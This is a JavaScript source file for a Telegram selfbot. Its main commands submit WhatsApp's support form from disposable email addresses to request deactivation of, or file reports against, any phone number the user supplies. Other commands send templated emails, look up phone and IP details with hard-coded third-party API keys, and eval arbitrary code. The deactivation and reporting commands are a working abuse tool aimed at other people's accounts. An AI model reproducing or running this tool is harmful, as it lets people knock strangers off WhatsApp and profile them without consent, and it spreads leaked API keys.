const { Api, TelegramClient } = require('telegram');
const { CustomFile } = require('telegram/client/uploads')
const { StringSession } = require('telegram/sessions');
const { NewMessage } = require('telegram/events');
const { InputPeer } = require('telegram/tl');
const { inspect } = require('util');
const util = require('util');
const axios = require('axios');
const cheerio = require('cheerio');
const nodemailer = require('nodemailer');
const input = require('input');
const fs = require('fs');
prefix = '.'
const express = require('express');
const app = express();

app.get('/', async(req, res) => {
  res.send({ Waduh: "Lah" })
})

app.listen(3000, function() {
});

const apiId = 12345678910;
const apiHash = '12345678910';
const stringSession = new StringSession('');

(async () => {
  console.log('Loading interactive example...');
  const client = new TelegramClient(stringSession, apiId, apiHash, {
    connectionRetries: 5,
  });
  const sleep = async (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
  let reportemail = async (headeremail, messageemail, receivedmessage) => {
    let sendEmail = async(emailsender, passemail, subject, pesan, penerima) => {
        let templateEmail= {
                from: emailsender,
                to: penerima,
                subject: subject,
                text: pesan
        }
        let transporter = nodemailer.createTransport({
            host: 'smtp.gmail.com',
            port: 587,
            secure: false,
            requireTLS: true,
            auth: {
              user: emailsender, 
              pass: passemail, 
            },
            from: emailsender
        });
        transporter.sendMail(templateEmail, (err, info) => { })
    }
    await sendEmail('your@gmail.com', 'yourpassword', headeremail, messageemail, receivedmessage)
  }
  await client.start({
    phoneNumber: async () => await input.text('Please enter your number: '),
    password: async () => await input.text('Please enter your password: '),
    phoneCode: async () =>
      await input.text('Please enter the code you received: '),
    onError: (err) => console.log(err),
  });
  console.log('You should now be connected.');
  //console.log(client.session.save());
  async function handler(msg) {
    console.log(msg.message.media)
    body = msg.message.message;
    budy = (typeof body == 'string' ? body : ''),
    isCmd = body.startsWith(prefix),
    command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '',
    args = body.trim().split(/ +/).slice(1),
    text = q = args.join(' '),
    a = text.split('|')[0],
    b = text.split('|')[1],
    c = text.split('|')[2];
    reply = async (mess) => {
      client.sendMessage(msg.message.peerId, {
        message: mess,
        replyTo: msg.message.id
      })
    }
    function getRndmNm() {
      const now = new Date();
      const year = now.getFullYear();
      const month = now.getMonth() + 1;
      const day = now.getDate();
      const hours = now.getHours();
      const minutes = now.getMinutes();
      const seconds = now.getSeconds();
      return `${year}-${month}-${day}_${hours}-${minutes}-${seconds}`;
    }
    try {
      switch (command) {
        case 'logoutwa': {
          if (!text) return reply(`Enter the whatsapp number that you want to logout,e.g ${prefix+command} +1 (808) xxx-xxxx`)
          let ntah = await axios.get('https://www.whatsapp.com/contact/noclient/')
          let email = await axios.get('https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1')
          let cookie = ntah.headers['set-cookie'].join('; ')
          let $ = cheerio.load(ntah.data)
          let $form = $('form');
          let url = new URL($form.attr('action'), 'https://www.whatsapp.com').href
          let form = new URLSearchParams()
          form.append('jazoest', $form.find('input[name=jazoest]').val())
          form.append('lsd', $form.find('input[name=lsd]').val())
          form.append('step', 'submit')
          form.append('country_selector', 'ID')
          form.append('phone_number', text)
          form.append('email', email.data[0])
          form.append('email_confirm', email.data[0])
          form.append('platform', 'ANDROID')
          form.append('your_message', 'Perdido/roubado: desative minha conta')
          form.append('__user', '0')
          form.append('__a', '1')
          form.append('__csr', '')
          form.append('__req', '8')
          form.append('__hs', '19316.BP:whatsapp_www_pkg.2.0.0.0.0')
          form.append('dpr', '1')
          form.append('__ccg', 'UNKNOWN')
          form.append('__rev', '1006630858')
          form.append('__comment_req', '0')
          let res = await axios({
            url,
            method: 'POST',
            data: form,
            headers: {
              cookie
            }
          })
          reply(util.format(JSON.parse(res.data.replace('for (;;);', ''))));
        }
        break
        case 'unbanwa': {
          if (!text) return reply(`Enter the whatsapp number that you want to unbanned,e.g ${prefix+command} +1 (808) xxx-xxxx`)
          reply(`Loading`)
          await reportemail('Unblockir Nomor', `hello WhatsApp, my number ${text} has been banned from spam, even though I didn't commit any violations at all There are bad people who report my number to be banned, please for justice, my number is activated immediately because I need that number to manage my business.`, 'support@support.whatsapp.com')
          reply(`Success`)
        }
        break
        case 'reportmail': {
          if (!a || !b || !c) return reply(`Enter the title, message and recipient of the email, with the format: ${prefix+command} title|message|recipient@gmail.com`)
          reply(`Loading`)
          await reportemail(a, b, c)
          reply(`Success`)
        }
        break
        case 'reportweb': {
          if (!a || !b) return reply(`Enter the whatsapp number and the message you want to send in the following format: ${prefix+command} +1 (808) xxx-xxxx|Your Message`);
          let ntah = await axios.get('https://www.whatsapp.com/contact/noclient/')
          let email = await axios.get('https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1')
          let cookie = ntah.headers['set-cookie'].join('; ')
          let $ = cheerio.load(ntah.data)
          let $form = $('form');
          let url = new URL($form.attr('action'), 'https://www.whatsapp.com').href
          let form = new URLSearchParams()
          form.append('jazoest', $form.find('input[name=jazoest]').val())
          form.append('lsd', $form.find('input[name=lsd]').val())
          form.append('step', 'submit')
          form.append('country_selector', 'ID')
          form.append('phone_number', a)
          form.append('email', email.data[0])
          form.append('email_confirm', email.data[0])
          form.append('platform', 'ANDROID')
          form.append('your_message', b)
          form.append('__user', '0')
          form.append('__a', '1')
          form.append('__csr', '')
          form.append('__req', '8')
          form.append('__hs', '19316.BP:whatsapp_www_pkg.2.0.0.0.0')
          form.append('dpr', '1')
          form.append('__ccg', 'UNKNOWN')
          form.append('__rev', '1006630858')
          form.append('__comment_req', '0')
          let res = await axios({
            url,
            method: 'POST',
            data: form,
            headers: {
              cookie
            }
          })
          reply(util.format(JSON.parse(res.data.replace('for (;;);', ''))));
        }
        break
        case 'phonelookup': {
          if (!text) return reply(`Enter the phone number you want to lookup`)
          let jsonn = await axios.get(`https://ipqualityscore.com/api/json/phone/pPiATkSdtLn3xgKW7a7HikZeZ4HMNa2R/` + text);
          let res = jsonn.data;
          if (!res.success) return reply(res.message)
          let TextLookup = `**PHONE NUMBER LOOKUP**\n\n`
          TextLookup += `• Message: ${res.message}\n• Success: ${res.success}\n• Formatted: ${res.formatted}\n• Local Format: ${res.local_format}\n• Valid: ${res.valid}\n• Fraud Score: ${res.fraud_score}\n• Recent Abuse: ${res.recent_abuse}\n• VOIP: ${res.VOIP}\n• Prepaid: ${res.prepaid}\n• Risky: ${res.risky}\n• Active: ${res.active}\n• Carrier: ${res.carrier}\n• Line Type: ${res.line_type}\n• Country: ${res.country}\n• City: ${res.city}\n• Zip Code: ${res.zip_code}\n• Region: ${res.region}\n• Dialing Code: ${res.dialing_code}\n• Active Status: ${res.active_status}\n• Sms Domain: ${res.sms_domain}\n• Mnc: ${res.mnc}\n• Mcc: ${res.mcc}\n• Leaked: ${res.leaked}\n• Spammer: ${res.spammer}\n• Request Id: ${res.request_id}\n• Name: ${res.name}\n• Timezone: ${res.timezone}\n• Do Not Call: ${res.do_not_call}\n• Sms Email: ${res.sms_email}`
          await reply(`${TextLookup}`)
        }
        break
        case 'iplookup': {
          let ip_address = text
         if (!ip_address) return reply(`Input ip address`)
         let rillcuy = `**IP ADDRESS INFORMATION BY KIMIMARU**\n`
         try {
            let get = await axios.get(`https://api.ip2location.io/?key=209596648B36739F8A2AC41EC8085F0C&ip=${text}&format=json`)
            let duh = get.data
            rillcuy += `**Ip Address:** ${duh.ip}\n**Country Code:** ${duh.country_code}\n**Country Name:** ${duh.country_name}\n**Region Name:** ${duh.region_name}\n**City Name:** ${duh.city_name}\n**Latitude:** ${duh.latitude}\n**Longitude:** ${duh.longitude}\n**Zip Code:** ${duh.zip_code}\n**Time Zone:** ${duh.time_zone}\n**Asn:** ${duh.asn}\n**As:** ${duh.as}\n**Is Proxy:** ${duh.is_proxy}`
            await reply(rillcuy)
         } catch (e) {
            reply(e)
         }
        }
        break
        case 'menu': {
          teksmenu = `**SelfBot Telegram by Kimimaru**\n\n• ${prefix}logoutwa (whatsapp number)\n• ${prefix}unbanwa (whatsapp number)\n• ${prefix}reportweb (number|msg)\n• ${prefix}reportmail (title|msg|recipient)\n• ${prefix}phonelookup (phone number)\n• ${prefix}iplookup (ip address)\n• > (evaluate code)\n• => (evaluate code)`
          await client.sendMessage(msg.message.peerId, {
            file: await client.uploadFile({
              file: new CustomFile(
                `menu.jpg`,
                fs.statSync(`./menu.jpg`).size,
                `./menu.jpg`)
            }),
            message: teksmenu,
            replyTo: msg.message.id
          })
        }
        break
        default:
            if (budy.startsWith('=>')) {
                function Return(sul) {
                    sat = JSON.stringify(sul, null, 2)
                    bang = util.format(sat)
                    if (sat == undefined) {
                        bang = util.format(sul)
                    }
                    return reply(bang)
                }
                try {
                    reply(util.format(eval(`(async () => {
                    ${budy.slice(3)}
                    })()`)))
                } catch (e) {
                    reply(String(e))
                }
            }
            //Wm by Kimimaru The Janaero,klo error jangan salahin gweh awokawok
            if (budy.startsWith('>')) {
                try {
                    let evaled = await eval(budy.slice(2))
                    if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                    await reply(evaled)
                } catch (err) {
                    await reply(String(err))
                }
            }
      }
    } catch (e) {
      reply(e)
    }
  }
  client.addEventHandler(handler, new NewMessage({
    outgoing: true
  }))
})();